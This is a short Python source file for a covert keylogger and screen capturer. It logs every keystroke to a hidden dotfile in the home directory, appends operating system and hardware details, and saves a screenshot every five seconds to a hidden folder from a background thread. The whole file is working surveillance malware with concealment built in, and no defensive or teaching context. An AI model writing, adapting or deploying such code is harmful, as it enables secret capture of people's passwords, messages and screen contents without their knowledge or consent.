import os
import threading
import time
import platform
import psutil
from pynput import keyboard
from mss import mss

log_file = os.path.expanduser("~/.hidden_keylog.log")
screenshot_dir = os.path.expanduser("~/.screenshots")

SCREENSHOT_INTERVAL = 5

os.makedirs(screenshot_dir, exist_ok=True)

#Function to capture keystrokes
def on_press(key):
    try:
        with open(log_file, 'a') as f:
            if hasattr(key, 'char') and key.char is not None:
                f.write(f"Key Pressed: {key.char}\n")
            elif key == keyboard.Key.space:
                f.write("Key Pressed: Space\n")
            elif key == keyboard.Key.enter:
                f.write("Key Pressed: Enter\n")
            elif key == keyboard.Key.backspace:
                f.write("Key Pressed: Backspace\n")
            elif key == keyboard.Key.shift:
                f.write("Key Pressed: Shift\n")
            elif key == keyboard.Key.caps_lock:
                f.write("Key Pressed: Caps Lock\n")
            elif key == keyboard.Key.tab:
                f.write("Key Pressed: Tab\n")
            else:
                f.write(f"Key Pressed: {key}\n")  # For other special keys
    except Exception as e:
        pass

# Function to get system info
def get_system_info():
    sys_info = {
        "OS": platform.system(),
        "OS Version": platform.version(),
        "Machine": platform.machine(),
        "Processor": platform.processor(),
        "RAM": f"{round(psutil.virtual_memory().total / (1024.0 ** 3))} GB"
    }
    return sys_info

# Function to log system info
def log_system_info():
    with open(log_file, 'a') as f:
        sys_info = get_system_info()
        f.write("\n\n[System Information]\n")
        for key, value in sys_info.items():
            f.write(f"{key}: {value}\n")

# Function to capture screenshots
def capture_screenshots():
    with mss() as sct:
        while True:
            timestamp = int(time.time())
            screenshot_path = os.path.join(screenshot_dir, f"screenshot_{timestamp}.png")
            sct.shot(output=screenshot_path)
            time.sleep(SCREENSHOT_INTERVAL)

def start_keylogging():
    log_system_info()
    try:
        with keyboard.Listener(on_press=on_press) as listener:
            listener.join()
    except KeyboardInterrupt:
        print("Keylogger stopped.")

screenshot_thread = threading.Thread(target=capture_screenshots)
screenshot_thread.daemon = True
screenshot_thread.start()

# Start keylogging
start_keylogging()
